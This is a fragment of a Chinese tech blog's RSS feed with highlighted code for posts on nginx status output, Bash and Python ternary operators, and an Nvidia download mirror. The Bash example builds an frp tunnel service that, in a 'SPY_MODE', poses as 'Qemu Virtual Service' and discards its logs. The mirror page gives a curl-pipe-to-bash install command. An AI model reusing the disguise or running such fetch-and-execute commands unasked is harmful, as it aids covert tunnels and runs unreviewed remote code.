<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       Docs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mannginx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194847</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ExecStartPre=usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">code</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">exited,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194848</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ExecStart=usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">code</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">exited,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0SUCCESS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   Main</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> PID</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 194849</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (nginx)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      Tasks</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (limit </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">38341</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Memory</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 13.8M</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 43ms</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     CGroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system.slicenginx.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194849</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> usrsbinnginx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -g</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">master_process</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194850</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194851</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194852</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194853</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194854</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194855</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194856</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194857</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194858</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194859</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194860</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194861</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194862</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194863</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             ├─194864</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">             └─194865</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> worker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> process</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                           </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Apr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 152345</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa-ai</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemd[1]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Apr</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 152345</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa-ai</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemd[1]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Started</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Bash实现三目运算符</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Shell/Bash%E5%AE%9E%E7%8E%B0%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Shell/Bash%E5%AE%9E%E7%8E%B0%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Bash实现三目运算符</source>
      <description>Bash实现三目运算符 三目运算符 shell能否实现三目运算符呢？像下面这样： 实现方法 原理 &amp;&amp;的优先级比||高，所以如果前面的&amp;&amp;成功，后面的||就不会执行；相反，后面的||就会执行。 案例</description>
      <pubDate>Thu, 11 Apr 2024 06:03:42 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>三目运算符</h2>
<p>shell能否实现三目运算符呢？像下面这样：</p>
<div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">int</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (b </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">==</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> c </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> d;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>实现方法</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$([ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ] &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> || </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>原理</h2>
<p>&amp;&amp;的优先级比||高，所以如果前面的&amp;&amp;成功，后面的||就不会执行；相反，后面的||就会执行。</p>
<h2>案例</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/systemd/system/</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">TARGET_FRP_NAME</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.service</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">[Unit]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Description=$([ "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">SPY_MODE</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">" </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "False" ] &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Frp Server Service" </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">||</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Qemu Virtual Service")</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">After=network.target syslog.target</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Wants=network.target</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">[Service]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Type=simple</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Restart=on-failure</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">RestartSec=5s</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ExecStart=</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">FRP_PATH</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">TARGET_FRP_NAME</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -c </span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">FRP_PATH</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">TARGET_FRP_NAME</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.ini</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">$([ "</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">SPY_MODE</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">" </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "False" ] &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "" </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">||</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "StandardOutput=null\nStandardError=null")</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">[Install]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">WantedBy=multi-user.target</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Python实现三目运算符</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%AE%9E%E7%8E%B0%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%AE%9E%E7%8E%B0%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Python实现三目运算符</source>
      <description>Python实现三目运算符 都知道Python中没有三目运算符，但是熟练C等语言写作方式，如何去实现三目运算符呢？ 实现 这时一段C语言的三目运算符代码 用Python实现如下 公式：在Python中需要将条件和和条件为True的表达是位置交换</description>
      <pubDate>Sat, 06 Apr 2024 03:40:58 GMT</pubDate>
      <content:encoded><![CDATA[
<p>都知道Python中没有三目运算符，但是熟练C等语言写作方式，如何去实现三目运算符呢？</p>
<h2>实现</h2>
<p>这时一段C语言的三目运算符代码</p>
<div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">c </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> b</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> b</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>用Python实现如下</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">c </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> b </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> b</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>公式：在Python中需要将条件和和条件为True的表达是位置交换</p>
]]></content:encoded>
    </item>
    <item>
      <title>Nvidia镜像站</title>
      <link>https://www.geekery.cn/free-service/nvidia-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/nvidia-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nvidia镜像站</source>
      <description>Nvidia镜像站 在 Ubuntu 系统中使用 Nvidia 显卡时，下载驱动速度可能会非常慢。为了解决这个问题，我搭建了一个镜像站来加速下载。 镜像站提供两个主要地址： 开发者工具镜像站 地址：nvidia-developer.geekery.cn 包含 CUDA 工具等 Nvidia 开发必需资源。 Docker Runtime 镜像站 地址：n...</description>
      <pubDate>Wed, 03 Apr 2024 06:28:09 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在 Ubuntu 系统中使用 Nvidia 显卡时，下载驱动速度可能会非常慢。为了解决这个问题，我搭建了一个镜像站来加速下载。</p>
<p>镜像站提供两个主要地址：</p>
<p><strong>开发者工具镜像站</strong></p>
<ul>
<li>地址：<a href="https://nvidia-developer.geekery.cn" target="_blank" rel="noopener noreferrer">nvidia-developer.geekery.cn</a></li>
<li>包含 CUDA 工具等 Nvidia 开发必需资源。</li>
</ul>
<p><strong>Docker Runtime 镜像站</strong></p>
<ul>
<li>地址：<a href="https://nvidia-docker.geekery.cn" target="_blank" rel="noopener noreferrer">nvidia-docker.geekery.cn</a></li>
<li>提供 libnvidia-container，用于支持容器内的 Nvidia 显卡运行。</li>
</ul>
<ul>
<li>
<p>预览<strong>libnvidia-container</strong> 镜像源  <a href="https://nvidia-docker.geekery.cn/libnvidia-container/stable/" target="_blank" rel="noopener noreferrer">https://nvidia-docker.geekery.cn/libnvidia-container/stable/</a></p>
</li>
<li>
<p>预览<strong>cuda</strong> 镜像仓库    <a href="https://nvidia-developer.geekery.cn/compute/cuda/repos/" target="_blank" rel="noopener noreferrer">https://nvidia-developer.geekery.cn/compute/cuda/repos/</a></p>
</li>
</ul>
<h2>一键部署Nvidia-Docker脚本</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/apt/nvidia-docker.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>脚本中一键部署了</p>
<ul>
<li>cuda工具</li>
<li>docker runtime</li>
<li>docker</li>
</ul>
<p>支持系统版本</p>
